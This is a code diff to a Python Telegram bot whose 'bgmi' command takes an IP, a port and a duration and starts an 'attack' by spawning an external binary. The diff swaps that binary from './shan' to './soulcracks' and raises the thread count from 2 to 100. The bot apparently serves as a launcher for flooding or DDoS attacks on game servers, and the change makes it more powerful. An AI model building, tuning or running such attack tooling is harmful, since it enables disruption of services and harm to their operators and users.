@@ -12,7 +12,7 @@ CHANNEL_ID = "-1002247039181"  # Note the '-' prefix for supergroup channels
 INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
 MAX_TIME = 120
 COOLDOWN_PERIOD = timedelta(minutes=5)
-thread = "2"
+thread = "100"
 # Global variable to track the last attack time for cooldown
 last_attack_time = {}
 
@@ -78,7 +78,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Execute the command using subprocess
     try:
-        subprocess.Popen(["./shan", ip, str(port), str(time_sec), thread])
+        subprocess.Popen(["./soulcracks", ip, str(port), str(time_sec), thread])
     except Exception as e:
         await update.message.reply_text(f"Failed to start attack: {e}")
         return
